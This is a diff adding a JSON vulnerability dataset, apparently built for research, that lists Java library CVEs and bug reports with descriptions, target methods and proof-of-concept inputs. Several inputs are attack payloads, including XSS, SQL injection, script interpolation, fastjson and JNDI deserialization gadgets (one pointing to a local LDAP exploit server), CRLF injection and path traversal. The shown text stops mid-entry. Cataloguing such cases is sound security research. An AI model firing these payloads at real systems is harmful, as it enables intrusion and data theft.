@@ -1,0 +1,728 @@
+[
+
+  {
+    "CVE_Number": "CODEC-263",
+    "Category": "behavior-inconsistency",
+    "CVE_Library": "commons-codec/commons-codec",
+    "CVE_Library_version": "1.13",
+    "CVE_Library_url": "https://issues.apache.org/jira/browse/CODEC-263",
+    "CVE_POC": "\"publishMessage\"",
+    "CVE_Description": "Codec upgrade to 1.13, code  throw exception as follows：\n\n  @Test\n  public  void test(){\n    Base64.decodeBase64(\"publishMessage\");\n  }\nexception like：\n\njava.lang.IllegalArgumentException: Last encoded character (before the paddings if any) is a valid base 64 alphabet but not a possible value\n\n\tat org.apache.commons.codec.binary.Base64.validateCharacter(Base64.java:798)\n\tat org.apache.commons.codec.binary.Base64.decode(Base64.java:472)\n\tat org.apache.commons.codec.binary.BaseNCodec.decode(BaseNCodec.java:412)\n\tat org.apache.commons.codec.binary.BaseNCodec.decode(BaseNCodec.java:395)\n\tat org.apache.commons.codec.binary.Base64.decodeBase64(Base64.java:694)",
+    "CVE_Class": "org.apache.commons.codec.binary.Base64",
+    "CVE_Method": "decodeBase64(java.lang.String):byte[]"
+  },
+  {
+    "CVE_Number": "CODEC-270",
+    "Category": "input-validation",
+    "CVE_Library": "commons-codec/commons-codec",
+    "CVE_Library_version": "1.13",
+    "CVE_Library_url": "https://issues.apache.org/jira/browse/CODEC-270",
+    "CVE_POC": "AB==",
+    "CVE_Description": "Both Base32 and Base64 check that the final bits from the trailing digit that will be discarded are zero.\n\nThe test for the trailing bits in the final digits in Base64 is:\n\nprivate long validateCharacter(final int numBitsToDrop, final Context context) {\n    if ((context.ibitWorkArea & numBitsToDrop) != 0) {\nIt should be:\n\nprivate long validateCharacter(final int numBitsToDrop, final Context context) {\n    int mask = (1 << numBitsToDrop) - 1;\n    if ((context.ibitWorkArea & mask) != 0) {\nLikewise in Base32.\n\nThe following base64 is illegal but is still decoded:\n\nAB==\n\nA : 000000\nB : 000001\n\nbyte = 00000000 + 0001 discarded \nHere the check for the 4 trailing bits to drop in this case checks only bit 3 and ignores bit 1 which is set.\n\nSame for Base32, this is illegal:\n\nAB======\n\nA : 00000\nB : 00001\n\nbyte = 00000000 + 01 discarded\nBut the check for the 2 trailing bits to drop in this case checks bit 2 and ignores bit 1 which is set.\n\nNote: The test cases using \"AC\" has bit 2 set and so is flagged as invalid.",
+    "CVE_Class": "org.apache.commons.codec.binary.Base64",
+    "CVE_Method": "decodeBase64(java.lang.String):byte[]"
+  },
+
+  {
+    "CVE_Number": "CODEC-134",
+    "Category": "input-validation",
+    "CVE_Library": "commons-codec/commons-codec",
+    "CVE_Library_version": "1.6",
+    "CVE_Library_url": "https://issues.apache.org/jira/browse/CODEC-134",
+    "CVE_POC": "\"C5CYMIHWQUUZMKUGZHGEOSJSQDE4L===\"",
+    "CVE_Description": "Example, there is no byte array value that can be encoded into the string \"C5CYMIHWQUUZMKUGZHGEOSJSQDE4L===\", but the existing Base32 implementation would not reject it but decode it into an arbitrary value which if re-encoded again using the same implementation would result in the string \"C5CYMIHWQUUZMKUGZHGEOSJSQDE4K===\".\n\nInstead of blindly decoding the invalid string, the Base32 codec should reject it (eg by throwing IlleglArgumentException) to avoid security exploitation (such as tunneling additional information via seemingly valid base 32 strings).",
+    "CVE_Class": "org.apache.commons.codec.binary.Base32",
+    "CVE_Method": "decode(java.lang.String):byte[]"
+  },
+  {
+    "CVE_Number": "CVE-2021-31812",
+    "Category": "denial-of-service",
+    "CVE_Library": "org.apache.pdfbox/pdfbox",
+    "CVE_Library_version": "2.0.23,<=2.0.x",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-31812",
+    "CVE_POC": "/Users/jiajunyu/paper/exploitvul/cve_data_test/src/main/file/crash-23adb315cc495bfd4761b16f877639d73d124d5b.pdf",
+    "CVE_Description": "In Apache PDFBox, a carefully crafted PDF file can trigger an infinite loop while loading the file. This issue affects Apache PDFBox version 2.0.23 and prior 2.0.x versions.",
+    "CVE_Class": "org.apache.pdfbox.pdmodel.PDDocument",
+    "CVE_Method": "load(java.io.File):org.apache.pdfbox.pdmodel.PDDocument"
+  },
+  {
+    "CVE_Number": "CVE-2019-12415",
+    "Category": "XXE",
+    "CVE_Library": "org.apache.poi/poi-ooxml",
+    "CVE_Library_version": "4.1.0,<=4.1.0",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-12415",
+    "CVE_POC": "/Users/jiajunyu/paper/exploitvul/cve_data_test/src/main/file/cve-2019-12415.xlsx , true",
+    "CVE_Description": "In Apache POI up to 4.1.0, when using the tool XSSFExportToXml to convert user-provided Microsoft Excel documents, a specially crafted document can allow an attacker to read files from the local filesystem or from internal network resources via XML External Entity (XXE) Processing.\n\n",
+    "CVE_Class": "org.apache.poi.xssf.extractor.XSSFExportToXml",
+    "CVE_Method": "exportToXML(java.io.OutputStream,boolean):void"
+  },
+  {
+    "CVE_Number": "CVE-2022-42889",
+    "Category": "remote-code-execution",
+    "CVE_Library": "org.apache.commons/commons-text",
+    "CVE_Library_version": ">=1.5,<=1.9",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2022-42889",
+    "CVE_POC": "${script:javascript:3+4}",
+    "CVE_Description": "Apache Commons Text performs variable interpolation, allowing properties to be dynamically evaluated and expanded. The standard format for interpolation is \"${prefix:name}\", where \"prefix\" is used to locate an instance of org.apache.commons.text.lookup.StringLookup that performs the interpolation. Starting with version 1.5 and continuing through 1.9, the set of default Lookup instances included interpolators that could result in arbitrary code execution or contact with remote servers. These lookups are: - \"script\" - execute expressions using the JVM script execution engine (javax.script) - \"dns\" - resolve dns records - \"url\" - load values from urls, including from remote servers Applications using the interpolation defaults in the affected versions may be vulnerable to remote code execution or unintentional contact with remote servers if untrusted configuration values are used. Users are recommended to upgrade to Apache Commons Text 1.10.0, which disables the problematic interpolators by default.",
+    "CVE_Class": "org.apache.commons.text.StringSubstitutor",
+    "CVE_Method": "replace(java.lang.String):java.lang.String"
+  },
+  {
+    "CVE_Number": "TEXT-215",
+    "Category": "xss-input-validation",
+    "CVE_Library": "org.apache.commons/commons-text",
+    "CVE_Library_version": "1.0",
+    "CVE_Library_url": "https://issues.apache.org/jira/browse/TEXT-215",
+    "CVE_POC": "<iframe src=\\\"&#106avascript:alert(1)\\\">",
+    "CVE_Description": "A security breach can be used in the NumericEntityUnescaper through the use of decimal character entities.\n\nAt line 117 a string of hexadecimal characters are searched, whether or not the entity is an hexadecimal one.\n\nTherefore, if the \"semiColonOptional\" option is enabled and a deicmal entity without semi-colon is immediately followed by one or several letters from A to F, these letters will be caught. The Integer parsing with a radix at 10 will then fail and the whole entity will be ignored.\n\nExample:\n\nIf one uses the following string: \n\n<iframe src=\\\"&#106avascript:alert(1)\\\">\nThe sequence identifying the entity will wrongly be \"&#106a\" instead of \"&#106\".\n\nAs \"&#106a\" is not a valid decimal entity, its Integer parsing fails and the whole entity remains escaped.\n\nSuch code would then trigger the alert on all modern browsers.",
+    "CVE_Class": "org.apache.commons.text.translate.OctalUnescaper",
+    "CVE_Method": "translate(java.lang.CharSequence,java.io.Writer):void"
+  },
+
+  {
+    "CVE_Number": "CVE-2019-10094",
+    "Category": "security/DoS",
+    "CVE_Library": "org.apache.tika/tika-core",
+    "CVE_Library_version": "1.7,<=1.21",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-10094",
+    "CVE_POC": "/Users/jiajunyu/paper/exploitvul/cve_data_test/src/main/file/droste.zip",
+    "CVE_Description": "A carefully crafted package/compressed file that, when unzipped/uncompressed yields the same file (a quine), causes a StackOverflowError in Apache Tika's RecursiveParserWrapper in versions 1.7-1.21. ",
+    "CVE_Class": "org.apache.tika.parser.RecursiveParserWrapper",
+    "CVE_Method": "parse(java.io.InputStream,org.xml.sax.ContentHandler,org.apache.tika.metadata.Metadata,org.apache.tika.parser.ParseContext):void"
+  },
+  {
+    "CVE_Number": "CVE-2020-28052",
+    "Category": "security/authentication bug",
+    "CVE_Library": "org.bouncycastle/bcprov-jdk15on",
+    "CVE_Library_version": "1.65,1.66",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2020-28052",
+    "CVE_POC": " Generate bcrypt token with OpenBSDBCrypt.generate(correctPassword, randomSalt, cost=4). Assert checkPassword(token, correctPassword)==true. Then loop salts until checkPassword(token, wrongPassword)==true (auth bypass). On bypass, print seed/iteration/token. On fixed versions (>=1.67) bypass should not occur.",
+    "CVE_Description": "An issue was discovered in Legion of the Bouncy Castle BC Java 1.65 and 1.66. The OpenBSDBCrypt.checkPassword utility method compared incorrect data when checking the password, allowing incorrect passwords to indicate they were matching with previously hashed ones that were different.",
+    "CVE_Class": "org.bouncycastle.crypto.generators.OpenBSDBCrypt",
+    "CVE_Method": "checkPassword(java.lang.String,Char[]):boolean"
+  },
+  {
+    "CVE_Number": "CVE-2019-10086",
+    "Category": "security/RCE",
+    "CVE_Library": "commons-beanutils/commons-beanutils",
+    "CVE_Library_version": "<=1.9.3",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-10086",
+    "CVE_POC": "class",
+    "CVE_Description": "In Apache Commons Beanutils 1.9.2, a special BeanIntrospector class was added which allows suppressing the ability for an attacker to access the classloader via the class property available on all Java objects. We, however were not using this by default characteristic of the PropertyUtilsBean.\n\n",
+    "CVE_Class": "org.apache.commons.beanutils.PropertyUtils",
+    "CVE_Method": "getProperty(java.lang.Object,java.lang.String):java.lang.Object"
+  },
+  {
+    "CVE_Number": "CVE-2018-1324",
+    "Category": "security/DoS",
+    "CVE_Library": "org.apache.commons/commons-compress",
+    "CVE_Library_version": "1.11,<=1.15",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1324",
+    "CVE_POC": "\"/Users/jiajunyu/paper/exploitvul/cve_data_test/src/main/file/CVE-2018-1324.zip\"",
+    "CVE_Description": "A specially crafted ZIP archive can be used to cause an infinite loop inside of Apache Commons Compress' extra field parser used by the ZipFile and ZipArchiveInputStream classes in versions 1.11 to 1.15. This can be used to mount a denial of service attack against services that use Compress' zip package.",
+    "CVE_Class": "org.apache.commons.compress.archivers.zip.ZipFile",
+    "CVE_Method": "<init>(java.lang.String):void"
+  },
+
+  {
+    "CVE_Number": "CVE-2019-12402",
+    "Category": "security/DoS",
+    "CVE_Library": "org.apache.commons/commons-compress",
+    "CVE_Library_version": "1.15,<=1.18",
+    "CVE_Library_url": "https://bugzilla.redhat.com/show_bug.cgi?id=1764640",
+    "CVE_POC": "test\\uDBFF",
+    "CVE_Description": "The file name encoding algorithm used internally in Apache Commons Compress 1.15 to 1.18 can get into an infinite loop when faced with specially crafted inputs. This can lead to a denial of service attack if an attacker can choose the file names inside of an archive created by Compress.\n\n",
+    "CVE_Class": "org.apache.commons.compress.archivers.zip.NioZipEncoding",
+    "CVE_Method": "encode(java.lang.String):java.nio.ByteBuffer"
+  },
+  {
+    "CVE_Number": "CVE-2021-35516",
+    "Category": "security/DoS",
+    "CVE_Library": "org.apache.commons/commons-compress",
+    "CVE_Library_version": "1.20",
+    "CVE_Library_url": "https://github.com/apache/commons-compress",
+    "CVE_POC": "/Users/jiajunyu/paper/exploitvul/cve_data_test/src/main/file/endheadercorrupted.7z",
+    "CVE_Description": "When reading a specially crafted 7Z archive, Compress can be made to allocate large amounts of memory that finally leads to an out of memory error even for very small inputs. This could be used to mount a denial of service attack against services that use Compress' sevenz package.",
+    "CVE_Class": "org.apache.commons.compress.archivers.sevenz.SevenZFile",
+    "CVE_Method": "<init>(java.io.File):void"
+  },
+  {
+    "CVE_Number": "CVE-2023-42503",
+    "Category": "denial-of-service",
+    "CVE_Library": "org.apache.commons/commons-compress",
+    "CVE_Library_version": "1.22, <=1.24.0",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-42503",
+    "CVE_POC": "/Users/jiajunyu/paper/exploitvul/cve_data_test/src/main/file/cve-2023-42503-evil.tar",
+    "CVE_Description": "Improper Input Validation, Uncontrolled Resource Consumption vulnerability in Apache Commons Compress in TAR parsing.This issue affects Apache Commons Compress: from 1.22 before 1.24.0. Users are recommended to upgrade to version 1.24.0, which fixes the issue. A third party can create a malformed TAR file by manipulating file modification times headers, which when parsed with Apache Commons Compress, will cause a denial of service issue via CPU consumption. In version 1.22 of Apache Commons Compress, support was added for file modification times with higher precision (issue # COMPRESS-612 [1]). The format for the PAX extended headers carrying this data consists of two numbers separated by a period [2], indicating seconds and subsecond precision (for example “1647221103.5998539”). The impacted fields are “atime”, “ctime”, “mtime” and “LIBARCHIVE.creationtime”. No input validation is performed prior to the parsing of header values. Parsing of these numbers uses the BigDecimal [3] class from the JDK which has a publicly known algorithmic complexity issue when doing operations on large numbers, causing denial of service (see issue # JDK-6560193 [4]). A third party can manipulate file time headers in a TAR file by placing a number with a very long fraction (300,000 digits) or a number with exponent notation (such as “9e9999999”) within a file modification time header, and the parsing of files with these headers will take hours instead of seconds, leading to a denial of service via exhaustion of CPU resources. ",
+    "CVE_Class": "org.apache.commons.compress.archivers.tar.TarArchiveInputStream",
+    "CVE_Method": "getNextTarEntry():org.apache.commons.compress.archivers.tar.TarArchiveEntry"
+  },
+
+  {
+    "CVE_Number": "CVE-2021-29425",
+    "Category": "security/path-traversal",
+    "CVE_Library": "commons-io/commons-io",
+    "CVE_Library_version": "<=2.6",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-29425",
+    "CVE_POC": "//../foo",
+    "CVE_Description": "In Apache Commons IO before 2.7, When invoking the method FileNameUtils.normalize with an improper input string, like \"//../foo\", or \"\\\\..\\foo\", the result would be the same value, thus possibly providing access to files in the parent directory, but not further above (thus \"limited\" path traversal), if the calling code would use the result to construct a path value.",
+    "CVE_Class": "org.apache.commons.io.FilenameUtils",
+    "CVE_Method": "normalize(java.lang.String):java.lang.String"
+  },
+  {
+    "CVE_Number": "IO-611",
+    "Category": "behavior-inconsistency",
+    "CVE_Library": "commons-io/commons-io",
+    "CVE_Library_version": "2.6",
+    "CVE_Library_url": "https://issues.apache.org/jira/browse/IO-611",
+    "CVE_POC": "//foo//./bar ",
+    "CVE_Description": "FilenameUtils.#normalize states in javadoc that //foo//./bar becomes /foo/bar\n\nSystem.out.println(FilenameUtils.normalize(\"//foo//./bar\"));\nSystem.out.println(FilenameUtils.normalize(\"\\\\\\\\foo\\\\\\\\.\\\\bar\"));\nResult:\n\n//foo//bar\n//foo//bar\nSo, javadoc says, that it should be /foo/bar. I think, that //foo is prefix, so it should be //foo/bar. But in real life it becomes the third way (//foo//bar).\n\n \n\nI think we should fix javadoc and the code. The correct result should be //foo/bar\n\n",
+    "CVE_Class": "org.apache.commons.io.FilenameUtils",
+    "CVE_Method": "normalize(java.lang.String):java.lang.String"
+  },
+  {
+    "CVE_Number": "LANG-1385",
+    "Category": "behavior-inconsistency",
+    "CVE_Library": "org.apache.commons/commons-lang3",
+    "CVE_Library_version": "3.7",
+    "CVE_Library_url": "https://issues.apache.org/jira/browse/LANG-1385",
+    "CVE_POC": "L",
+    "CVE_Description": "Test case:\n\nNumberUtils.createNumber(\"L\")\nExpected: NumberFormatException\n\nGot:\n\njava.lang.StringIndexOutOfBoundsException: String index out of range: 0\nat java.lang.String.charAt(String.java:658)\n at org.apache.commons.lang3.math.NumberUtils.createNumber(NumberUtils.java:528)",
+    "CVE_Class": "org.apache.commons.lang3.math.NumberUtils",
+    "CVE_Method": "createNumber(java.lang.String):java.lang.Number"
+  },
+  {
+    "CVE_Number": "LANG-1484",
+    "Category": "behavior-inconsistency",
+    "CVE_Library": "org.apache.commons/commons-lang3",
+    "CVE_Library_version": "3.8.1",
+    "CVE_Library_url": "https://issues.apache.org/jira/browse/LANG-1484",
+    "CVE_POC": "100.",
+    "CVE_Description": "From the Javadocs:\n\nParsable numbers include those Strings understood by ... Double.parseDouble(String).\n\nDouble.parseDouble(\"100.\") returns a valid double (it does not throw a NumberFormatException); however, NumberUtils.isParsable(\"100.\") returns false.",
+    "CVE_Class": "org.apache.commons.lang3.math.NumberUtils",
+    "CVE_Method": "isParsable(java.lang.String):boolean"
+  },
+  {
+    "CVE_Number": "LANG-1645",
+    "Category": "behavior-inconsistency",
+    "CVE_Library": "org.apache.commons/commons-lang3",
+    "CVE_Library_version": "3.12.0",
+    "CVE_Library_url": "https://issues.apache.org/jira/browse/LANG-1645",
+    "CVE_POC": "+0xF",
+    "CVE_Description": "The Java Language Specification allows an optional sign prefix for a number as + or -.\n\nA + sign before a hex integer is not recognised by createNumber and createBigInteger but is recognised by isCreatable, createInteger and createLong. The two later functions delegate to Java's decode() function that handles an optional leading +.\n\nThe following demonstrates the tests that fail but would pass if the leading '+' is removed.\n\n    @Test\n    void testCreatePositiveHexInteger() {\n        // Hex is only supported for integers so no test for hex floating point formats\n        assertTrue(NumberUtils.isCreatable(\"+0xF\"));\n        assertTrue(NumberUtils.isCreatable(\"+0xFFFFFFFF\"));\n        assertTrue(NumberUtils.isCreatable(\"+0xFFFFFFFFFFFFFFFFF\"));\n\n        assertEquals(Integer.decode(\"+0xF\"), NumberUtils.createInteger(\"+0xF\"));\n        assertEquals(Long.decode(\"+0xFFFFFFFF\"), NumberUtils.createLong(\"+0xFFFFFFFF\"));\n\n        assertEquals(new BigInteger(\"+FFFFFFFFFFFFFFFF\", 16),\n                     NumberUtils.createBigInteger(\"0xFFFFFFFFFFFFFFFF\"));\n        try {\n            assertEquals(new BigInteger(\"+FFFFFFFFFFFFFFFF\", 16),\n                         NumberUtils.createBigInteger(\"+0xFFFFFFFFFFFFFFFF\"));\n            Assertions.fail(\"This should be possible but it is not\");\n        } catch (NumberFormatException ex) {\n            // This should not happen\n        }\n\n        assertEquals(Integer.decode(\"+0xF\"),\n                     NumberUtils.createNumber(\"0xF\"));\n        try {\n            assertEquals(Integer.decode(\"+0xF\"),\n                         NumberUtils.createNumber(\"+0xF\"));\n            Assertions.fail(\"This should be possible but it is not\");\n        } catch (NumberFormatException ex) {\n            // This should not happen\n        }\n\n        assertEquals(Long.decode(\"+0xFFFFFFFF\"),\n                     NumberUtils.createNumber(\"0xFFFFFFFF\"));\n        try {\n            assertEquals(Long.decode(\"+0xFFFFFFFF\"),\n                         NumberUtils.createNumber(\"+0xFFFFFFFF\"));\n            Assertions.fail(\"This should be possible but it is not\");\n        } catch (NumberFormatException ex) {\n            // This should not happen\n        }\n\n        assertEquals(new BigInteger(\"+FFFFFFFFFFFFFFFF\", 16),\n                     NumberUtils.createNumber(\"0xFFFFFFFFFFFFFFFF\"));\n        try {\n            assertEquals(new BigInteger(\"+FFFFFFFFFFFFFFFF\", 16),\n                         NumberUtils.createNumber(\"+0xFFFFFFFFFFFFFFFF\"));\n            Assertions.fail(\"This should be possible but it is not\");\n        } catch (NumberFormatException ex) {\n            // This should not happen\n        }\n    }\n",
+    "CVE_Class": "org.apache.commons.lang3.math.NumberUtils",
+    "CVE_Method": "createNumber(java.lang.String):java.lang.Number"
+  },
+
+  {
+    "CVE_Number": "CVE-2018-1000632",
+    "Category": "security/XML injection",
+    "CVE_Library": "org.dom4j/dom4j",
+    "CVE_Library_version": "<=2.1.0",
+    "CVE_Library_url": "https://github.com/Robthreefold/java-goof/issues/211",
+    "CVE_POC": "\"injectedAttribute\"",
+    "CVE_Description": "dom4j version prior to version 2.1.1 contains a CWE-91: XML Injection vulnerability in Class: Element. Methods: addElement, addAttribute that can result in an attacker tampering with XML documents through XML injection. This attack appear to be exploitable via an attacker specifying attributes or elements in the XML document. This vulnerability appears to have been fixed in 2.1.1 or later.",
+    "CVE_Class": "org.dom4j.Element",
+    "CVE_Method": "addElement(java.lang.String):org.dom4j.Element"
+  },
+
+  {
+    "CVE_Number": "CVE-2022-25845",
+    "Category": "security/RCE",
+    "CVE_Library": "com.alibaba/fastjson",
+    "CVE_Library_version": ">=1.2.25,<1.2.83",
+    "CVE_Library_url": "https://github.com/alibaba/fastjson",
+    "CVE_POC": "{\"x\":{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\"message\":\"CVE-2022-25845-demo\"}}",
+    "CVE_Description": "The package com.alibaba:fastjson before 1.2.83 are vulnerable to Deserialization of Untrusted Data by bypassing the default autoType shutdown restrictions, which is possible under certain conditions. Exploiting this vulnerability allows attacking remote servers. Workaround: If upgrading is not possible, you can enable [safeMode](https://github.com/alibaba/fastjson/wiki/fastjson_safemode).",
+    "CVE_Class": "com.alibaba.fastjson.JSON",
+    "CVE_Method": "parse(java.lang.String):java.lang.Object"
+  },
+
+  {
+    "CVE_Number": "CVE-2019-14900",
+    "Category": "security/SQL injection",
+    "CVE_Library": "org.hibernate/hibernate-orm",
+    "CVE_Library_version": "<5.3.18, <5.4.18, <5.5.0.Beta1",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-14900",
+    "CVE_POC": "\"x' OR '1'='1\"",
+    "CVE_Description": "A flaw was found in Hibernate ORM in versions before 5.3.18, 5.4.18 and 5.5.0.Beta1. A SQL injection in the implementation of the JPA Criteria API can permit unsanitized literals when a literal is used in the SELECT or GROUP BY parts of the query. This flaw could allow an attacker to access unauthorized information or possibly conduct further attacks.",
+    "CVE_Class": "org.hibernate.query.criteria.internal.CriteriaBuilderImpl",
+    "CVE_Method": "literal(T value)",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2020-10693",
+    "Category": "security/EL injection",
+    "CVE_Library": "hibernate/validator",
+    "CVE_Library_version": "6.1.2.Final",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2020-10693",
+    "CVE_POC": "",
+    "CVE_Description": "A flaw was found in Hibernate Validator version 6.1.2.Final. A bug in the message interpolation processor enables invalid EL expressions to be evaluated as if they were valid. This flaw allows attackers to bypass input sanitation (escaping, stripping) controls that developers may have put in place when handling user-controlled data in error messages.",
+    "CVE_Class": "org.hibernate.validator.internal.engine.messageinterpolation.InterpolationTerm",
+    "CVE_Method": "interpolate / parseElExpression",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2020-13956",
+    "Category": "security/incorrect host parsing",
+    "CVE_Library": "org.apache.httpcomponents/httpclient",
+    "CVE_Library_version": "<4.5.13, <5.0.3",
+    "CVE_Library_url": "https://lists.apache.org/thread/g0fbdtc07gw8xn7fcjd8gygkn0kq8p5n",
+    "CVE_POC": " http://user@apache.org:80@google.com/",
+    "CVE_Description": "Apache HttpClient versions prior to version 4.5.13 and 5.0.3 can misinterpret malformed authority component in request URIs passed to the library as java.net.URI object and pick the wrong target host for request execution.\n\n",
+    "CVE_Class": "org.apache.http.client.methods.HttpGet",
+    "CVE_Method": "<init>(java.lang.String):void"
+  },
+  {
+    "CVE_Number": "HTTPCLIENT-1803",
+    "Category": "behavior-inconsistency/security bug",
+    "CVE_Library": "org.apache.httpcomponents/httpclient",
+    "CVE_Library_version": "4.5.1",
+    "CVE_Library_url": "https://issues.apache.org/jira/browse/HTTPCLIENT-1803",
+    "CVE_POC": "@notexample.com/mypath",
+    "CVE_Description": "When using URIBuilder's constructor with a malformed url argument, host passed in by setHost call not honored.\n\nString path = \"@notexample.com/mypath\"\nURI uri = new URIBuilder(path).setHost(\"example.com\").build();\norg.junit.Assert.assertEquals(\"example.com\", uri.getHost())\n\nThis is caused by the original string being passed into the constructor being treated as the path, but not verifying the presence of a leading / character.\nThis can be seen with other arguments:\n\npath = \"example\" -> //example.comexample\n\nFix: URIBuilder should ensure path starts with a leading /.\n\nReason priority is considered Major:\nIn our case, this caused a security vulnerability which was discovered by researcher James Kettle (@albinowax on twitter). The user-provided path was able to override our specified host, resulting in giving network access to a sensitive environment. We worked around this in our code by ensuring the leading /, but this seems like something better handled by the framework.",
+    "CVE_Class": "org.apache.http.client.utils.URIBuilder",
+    "CVE_Method": "setPath(java.lang.String):org.apache.http.client.utils.URIBuilder"
+  },
+  {
+    "CVE_Number": "CVE-2022-42004",
+    "Category": "security/DoS",
+    "CVE_Library": "com.fasterxml.jackson.core/jackson-databind",
+    "CVE_Library_version": "<2.13.4",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2022-42004",
+    "CVE_POC": "",
+    "CVE_Description": "In FasterXML jackson-databind before 2.13.4, resource exhaustion can occur because of a lack of a check in BeanDeserializer._deserializeFromArray to prevent use of deeply nested arrays. An application is vulnerable only with certain customized choices for deserialization.",
+    "CVE_Class": "com.fasterxml.jackson.databind.ObjectMapper",
+    "CVE_Method": "readValue(java.lang.String,java.lang.Class):T",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2019-14540",
+    "Category": "security/deserialization",
+    "CVE_Library": "com.fasterxml.jackson.core/jackson-databind",
+    "CVE_Library_version": "<2.9.10",
+    "CVE_Library_url": "https://curz0n.github.io/2019/09/20/cve-2019-14540/",
+    "CVE_POC": "\"com.zaxxer.hikari.HikariConfig\",{\"metricRegistry\":\"ldap://127.0.0.1:1389/exploit\"}",
+    "CVE_Description": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10. It is related to com.zaxxer.hikari.HikariConfig.",
+    "CVE_Class": "com.fasterxml.jackson.databind.ObjectMapper",
+    "CVE_Method": "readValue(java.lang.String,java.lang.Class):T",
+    "need_check": 1
+  },
+  {
+    "CVE_Number": "CVE-2020-28491",
+    "Category": "security/DoS",
+    "CVE_Library": "com.fasterxml.jackson.core/jackson-databind",
+    "CVE_Library_version": "<2.11.4,>=2.12-rc1,<2.12.1",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2020-28491",
+    "CVE_POC": "{-39, -39, -9, -93, 90, 127, -1, -1, -1, -9, -39, -9, -9, 89, -9, -9, -9 }",
+    "CVE_Description": "This affects the package com.fasterxml.jackson.dataformat:jackson-dataformat-cbor from 0 and before 2.11.4, from 2.12.0-rc1 and before 2.12.1. Unchecked allocation of byte buffer can cause a java.lang.OutOfMemoryError exception.",
+    "CVE_Class": "com.fasterxml.jackson.databind.ObjectMapper",
+    "CVE_Method": "readTree(byte[]):com.fasterxml.jackson.databind.JsonNode"
+  },
+  {
+    "CVE_Number": "CVE-2018-1000873",
+    "Category": "denial-of-service",
+    "CVE_Library": "com.fasterxml.jackson.core/jackson-databind",
+    "CVE_Library_version": "<2.9.8",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1000873",
+    "CVE_POC": "{\"v\":10}",
+    "CVE_Description": "Fasterxml Jackson version Before 2.9.8 contains a CWE-20: Improper Input Validation vulnerability in Jackson-Modules-Java8 that can result in Causes a denial-of-service (DoS). This attack appear to be exploitable via The victim deserializes malicious input, specifically very large values in the nanoseconds field of a time value. This vulnerability appears to have been fixed in 2.9.8.",
+    "CVE_Class": "com.fasterxml.jackson.databind.ObjectMapper",
+    "CVE_Method": "readValue(java.lang.String,java.lang.Class):T"
+  },
+  {
+    "CVE_Number": "CVE-2022-29631",
+    "Category": "security/SSRF/CRLF injection",
+    "CVE_Library": "org.jodd/jodd-http",
+    "CVE_Library_version": "6.0.9",
+    "CVE_Library_url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29631",
+    "CVE_POC": "http://127.0.0.1:19000/ HTTP/1.1\\r\\nX-PoC: injected\\r\\n\\r\\nINJECTED_PAYLOAD_LINE_1\\r\\nINJECTED_PAYLOAD_LINE_2\\r\\n\\r\\nGET /after_injection \n",
+    "CVE_Description": "Jodd HTTP v6.0.9 was discovered to contain multiple CLRF injection vulnerabilities via the components jodd.http.HttpRequest#set and `jodd.http.HttpRequest#send. These vulnerabilities allow attackers to execute Server-Side Request Forgery (SSRF) via a crafted TCP payload.",
+    "CVE_Class": "jodd.http.HttpRequest",
+    "CVE_Method": "get(java.lang.String):jodd.http.HttpRequest"
+  },
+  {
+    "CVE_Number": "CVE-2022-45688",
+    "Category": "security/DoS",
+    "CVE_Library": "cn.hutool/hutool-json",
+    "CVE_Library_version": "5.8.10",
+    "CVE_Library_url": "https://github.com/dromara/hutool",
+    "CVE_POC": "<a>X</a>",
+    "CVE_Description": "A stack overflow in the XML.toJSONObject component of hutool-json v5.8.10 allows attackers to cause a Denial of Service (DoS) via crafted JSON or XML data.",
+    "CVE_Class": "cn.hutool.json.XML",
+    "CVE_Method": "toJSONObject(java.lang.String):cn.hutool.json.JSONObject"
+  },
+
+  {
+    "CVE_Number": "CVE-2020-13973",
+    "Category": "security/XSS",
+    "CVE_Library": "com.mikesamuel/json-sanitizer",
+    "CVE_Library_version": "<1.2.1",
+    "CVE_Library_url": "https://github.com/OWASP/json-sanitizer/pull/20",
+    "CVE_POC": "\"<!--<script>\"",
+    "CVE_Description": "OWASP json-sanitizer before 1.2.1 allows XSS. An attacker who controls a substring of the input JSON, and controls another substring adjacent to a SCRIPT element in which the output is embedded as JavaScript, may be able to confuse the HTML parser as to where the SCRIPT element ends, and cause non-script content to be interpreted as JavaScript.",
+    "CVE_Class": "com.google.json.JsonSanitizer",
+    "CVE_Method": "sanitize(java.lang.String):java.lang.String"
+  },
+  {
+    "CVE_Number": "CVE-2021-23900",
+    "Category": "security/DoS",
+    "CVE_Library": "com.mikesamuel/json-sanitizer",
+    "CVE_Library_version": "<1.2.2",
+    "CVE_Library_url": "https://www.cve.org/CVERecord?id=CVE-2021-23900",
+    "CVE_POC": "\"\\u0010{'\\u0000\\u0000'\\\"\\u0000\\\"{.\\ufffd-0X29295909049550970,\\n\\n 0\"",
+    "CVE_Description": "OWASP json-sanitizer before 1.2.2 can output invalid JSON or throw an undeclared exception for crafted input. This may lead to denial of service if the application is not prepared to handle these situations.\n\n",
+    "CVE_Class": "com.google.json.JsonSanitizer",
+    "CVE_Method": "sanitize(java.lang.String):java.lang.String"
+  },
+  {
+    "CVE_Number": "CVE-2021-23899",
